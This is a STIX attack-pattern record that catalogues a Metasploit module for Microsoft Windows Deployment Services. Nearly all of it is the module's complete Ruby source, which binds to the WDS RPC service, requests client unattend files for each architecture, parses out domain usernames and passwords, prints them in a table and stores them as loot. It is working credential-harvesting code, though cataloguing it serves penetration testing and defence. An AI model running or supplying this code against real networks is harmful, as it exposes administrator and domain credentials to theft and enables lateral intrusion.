{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--15abbe4d-fd44-490a-b064-f2dd9746f263",
    "created": "2024-08-14T16:26:52.945928Z",
    "modified": "2024-08-14T16:26:52.945932Z",
    "name": "Microsoft Windows Deployment Services Unattend Retrieval",
    "description": " This module retrieves the client unattend file from Windows Deployment Services RPC service and parses out the stored credentials. Tested against Windows 2008 R2 x64 and Windows 2003 x86. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/dcerpc/windows_deployment_services.rb",
            "external_id": "windows_deployment_services.rb"
        },
        {
            "source_name": "reference",
            "url": "http://msdn.microsoft.com/en-us/library/dd891255(prot.20).aspx"
        },
        {
            "source_name": "reference",
            "url": "http://rewtdance.blogspot.com/2012/11/windows-deployment-services-clear-text.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  DCERPCPacket   \t= Rex::Proto::DCERPC::Packet\n  DCERPCClient   \t= Rex::Proto::DCERPC::Client\n  DCERPCResponse \t= Rex::Proto::DCERPC::Response\n  DCERPCUUID     \t= Rex::Proto::DCERPC::UUID\n  WDS_CONST \t\t  = Rex::Proto::DCERPC::WDSCP::Constants\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Windows Deployment Services Unattend Retrieval',\n      'Description'    => %q{\n        This module retrieves the client unattend file from Windows\n        Deployment Services RPC service and parses out the stored credentials.\n        Tested against Windows 2008 R2 x64 and Windows 2003 x86.\n      },\n      'Author'         => [ 'Ben Campbell' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://msdn.microsoft.com/en-us/library/dd891255(prot.20).aspx'],\n          [ 'URL', 'http://rewtdance.blogspot.com/2012/11/windows-deployment-services-clear-text.html']\n        ],\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(5040),\n      ])\n\n    deregister_options('CHOST', 'CPORT', 'SSL', 'SSLVersion')\n\n    register_advanced_options(\n      [\n        OptBool.new('ENUM_ARM', [true, 'Enumerate Unattend for ARM architectures (not currently supported by Windows and will cause an error in System Event Log)', false])\n      ])\n  end\n\n  def run_host(ip)\n    begin\n      query_host(ip)\n    rescue ::Interrupt\n      raise $!\n    rescue ::Rex::ConnectionError => e\n      print_error(\"#{ip}:#{rport} Connection Error: #{e}\")\n    ensure\n      # Ensure socket is pulled down afterwards\n      self.dcerpc.socket.close rescue nil\n      self.dcerpc = nil\n      self.handle = nil\n    end\n  end\n\n  def query_host(rhost)\n    # Create a handler with our UUID and Transfer Syntax\n\n    self.handle = Rex::Proto::DCERPC::Handle.new(\n      [\n        WDS_CONST::WDSCP_RPC_UUID,\n        '1.0',\n      ],\n      'ncacn_ip_tcp',\n      rhost,\n      [datastore['RPORT']]\n    )\n\n    print_status(\"Binding to #{handle} ...\")\n\n    self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)\n    vprint_good(\"Bound to #{handle}\")\n\n    report_service(\n      :host => rhost,\n      :port => datastore['RPORT'],\n      :proto => 'tcp',\n      :name => \"dcerpc\",\n      :info => \"#{WDS_CONST::WDSCP_RPC_UUID} v1.0 Windows Deployment Services\"\n    )\n\n    table = Rex::Text::Table.new({\n      'Header' => 'Windows Deployment Services',\n      'Indent' => 1,\n      'Columns' => ['Architecture', 'Type', 'Domain', 'Username', 'Password']\n    })\n\n    creds_found = false\n\n    WDS_CONST::ARCHITECTURE.each do |architecture|\n      if architecture[0] == :ARM && !datastore['ENUM_ARM']\n        vprint_status \"Skipping #{architecture[0]} architecture due to adv option\"\n        next\n      end\n\n      begin\n        result = request_client_unattend(architecture)\n      rescue ::Rex::Proto::DCERPC::Exceptions::Fault => e\n        vprint_error(e.to_s)\n        print_error(\"#{rhost} DCERPC Fault - Windows Deployment Services is present but not configured. Perhaps an SCCM installation.\")\n        return nil\n      end\n\n      unless result.nil?\n        loot_unattend(architecture[0], result)\n        results = parse_client_unattend(result)\n\n        results.each do |result|\n          unless result.empty?\n            if result['username'] and result['password']\n              print_good(\"Retrived #{result['type']} credentials for #{architecture[0]}\")\n              creds_found = true\n              domain = \"\"\n              domain = result['domain'] if result['domain']\n              report_creds(domain, result['username'], result['password'])\n              table << [architecture[0], result['type'], domain, result['username'], result['password']]\n            end\n          end\n        end\n      end\n    end\n\n    if creds_found\n      print_line\n      table.print\n      print_line\n    else\n      print_error(\"No Unattend files received, service is unlikely to be configured for completely unattended installation.\")\n    end\n  end\n\n  def request_client_unattend(architecture)\n    # Construct WDS Control Protocol Message\n    packet = Rex::Proto::DCERPC::WDSCP::Packet.new(:REQUEST, :GET_CLIENT_UNATTEND)\n\n    guid = Rex::Text.rand_text_hex(32)\n    packet.add_var(\tWDS_CONST::VAR_NAME_CLIENT_GUID, guid)\n\n    # Not sure what this padding is for...\n    mac = [0x30].pack('C') * 20\n    mac << Rex::Text.rand_text_hex(12)\n    packet.add_var(\tWDS_CONST::VAR_NAME_CLIENT_MAC, mac)\n\n    arch = [architecture[1]].pack('C')\n    packet.add_var(\tWDS_CONST::VAR_NAME_ARCHITECTURE, arch)\n\n    version = [1].pack('V')\n    packet.add_var(\tWDS_CONST::VAR_NAME_VERSION, version)\n\n    wdsc_packet = packet.create\n\n    vprint_status(\"Sending #{architecture[0]} Client Unattend request ...\")\n    dcerpc.call(0, wdsc_packet, false)\n    timeout = datastore['DCERPC::ReadTimeout']\n    response = Rex::Proto::DCERPC::Client.read_response(self.dcerpc.socket, timeout)\n\n    if (response and response.stub_data)\n      vprint_status('Received response ...')\n      data = response.stub_data\n\n      # Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000\n      op_error_code = data.unpack('v*')[19]\n      if op_error_code == 0\n        if data.length < 277\n          vprint_error(\"No Unattend received for #{architecture[0]} architecture\")\n          return nil\n        else\n          vprint_status(\"Received #{architecture[0]} unattend file ...\")\n          return extract_unattend(data)\n        end\n      else\n        vprint_error(\"Error code received for #{architecture[0]}: #{op_error_code}\")\n        return nil\n      end\n    end\n  end\n\n  def extract_unattend(data)\n    start = data.index('<?xml')\n    finish = data.index('</unattend>')\n    if start and finish\n      finish += 10\n      return data[start..finish]\n    else\n      print_error(\"Incomplete transmission or malformed unattend file.\")\n      return nil\n    end\n  end\n\n  def parse_client_unattend(data)\n    begin\n      xml = REXML::Document.new(data)\n      return Rex::Parser::Unattend.parse(xml).flatten\n    rescue REXML::ParseException => e\n      print_error(\"Invalid XML format\")\n      vprint_line(e.message)\n      return nil\n     end\n  end\n\n  def loot_unattend(archi, data)\n    return if data.empty?\n    p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, \"Windows Deployment Services\")\n    print_good(\"Raw version of #{archi} saved as: #{p}\")\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def report_creds(domain, user, pass)\n    report_cred(\n      ip: rhost,\n      port: 4050,\n      service_name: 'dcerpc',\n      user: \"#{domain}\\\\#{user}\",\n      password: pass,\n      proof: domain\n    )\n  end\nend\n"
}